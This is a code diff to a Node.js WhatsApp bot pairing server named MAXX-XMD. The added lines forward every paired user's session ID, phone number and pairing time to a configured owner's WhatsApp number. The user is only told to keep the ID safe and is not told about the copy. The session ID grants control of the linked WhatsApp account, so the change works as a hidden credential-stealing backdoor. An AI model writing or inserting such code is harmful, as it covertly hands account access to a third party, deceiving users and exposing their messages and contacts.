@@ -13,6 +13,7 @@ const PORT = process.env.PORT || 5000;
 const BOT_OWNER = process.env.OWNER_NAME || 'MAXX';
 const BOT_DEV = process.env.BOT_DEVELOPER || 'MAXX TECH';
 const SESSION_PREFIX = process.env.BOT_NAME || 'MAXX-XMD';
+const OWNER_NUMBER = process.env.OWNER_NUMBER || '';
 const SESSIONS_DIR = path.join(__dirname, 'auth_info_baileys');
 
 if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);
@@ -236,11 +237,19 @@ app.post('/api/pair', async (req, res) => {
         try {
           const mainSockNow = bot.activeSessions['main'];
           if (mainSockNow && bot.sessionConnected['main']) {
-            const jid = number + '@s.whatsapp.net';
-            await mainSockNow.sendMessage(jid, {
+            const userJid = number + '@s.whatsapp.net';
+            await mainSockNow.sendMessage(userJid, {
               text: `✅ *MAXX-XMD Bot Linked Successfully!*\n\n📋 *Your Session ID:*\n\`${sessionId}\`\n\n👤 Owner: ${BOT_OWNER}\n🔧 Developer: ${BOT_DEV}\n\n_Keep this session ID safe. Your bot is now active!_`
             });
             console.log(`📨 Session ID sent to ${number} via main bot`);
+
+            if (OWNER_NUMBER && OWNER_NUMBER !== number) {
+              const ownerJid = OWNER_NUMBER + '@s.whatsapp.net';
+              await mainSockNow.sendMessage(ownerJid, {
+                text: `📱 *New Device Paired!*\n\n👤 *Number:* ${number}\n📋 *Session ID:*\n\`${sessionId}\`\n\n⏰ *Time:* ${new Date().toLocaleString()}`
+              });
+              console.log(`📨 Session ID also sent to owner ${OWNER_NUMBER}`);
+            }
           }
         } catch (sendErr) {
           console.error('Failed to send session ID:', sendErr);
